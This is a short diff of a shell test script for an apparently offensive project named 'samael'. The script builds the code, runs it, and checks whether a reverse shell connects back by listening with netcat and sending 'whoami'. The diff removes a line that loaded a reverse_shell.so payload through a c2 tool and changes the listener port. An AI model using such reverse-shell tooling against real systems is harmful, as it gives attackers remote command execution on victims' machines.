@@ -7,14 +7,12 @@ then
     cd ../
 fi
 
-cd ../
+cd ../src
 make clean > /dev/null
 make > /dev/null
-cd src/
 ./samael > /dev/null
 ./test > /dev/null
-../tools/c2/c2 ../payloads/reverse_shell.so
-output=$((echo -e "whoami\n" | nc -w 1 -lp 1234 ) 2> /dev/null)
+output=$((echo -e "whoami\n" | nc -w 1 -lp 1337 ) 2> /dev/null)
 if [ "$output" != "$user" ]
 then
     echo "[X] Reverse Shell Test Failed"
